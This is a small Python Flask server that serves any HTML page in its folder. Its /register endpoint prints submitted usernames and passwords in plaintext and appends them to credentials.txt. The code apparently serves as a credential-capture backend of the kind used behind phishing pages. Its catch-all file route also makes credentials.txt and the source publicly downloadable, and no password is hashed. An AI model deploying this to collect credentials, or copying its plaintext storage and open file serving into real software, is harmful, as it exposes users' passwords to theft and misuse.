import os
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

def get_html_filename():
    if os.path.exists("index.html"):
        return "index.html"
    for file in os.listdir("."):
        if file.endswith(".html"):
            return file
    return None

@app.route('/')
def home():
    filename = get_html_filename()
    if filename:
        with open(filename, "r", encoding="utf-8") as f:
            return f.read()
    return "<h1>Error: No HTML file found!</h1>", 404

@app.route('/<filename>')
def serve_static(filename):
    if os.path.exists(filename):
        return send_from_directory('.', filename)
    return '', 404

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json() or {}
    username = data.get('username')
    password = data.get('password')
    
    log_entry = f"Username: {username} | Password: {password}\n"
    print(f"[Server Received] {log_entry.strip()}")
    
    # Save to a text file in the same folder
    with open("credentials.txt", "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    return jsonify({"message": "User registered successfully!"}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)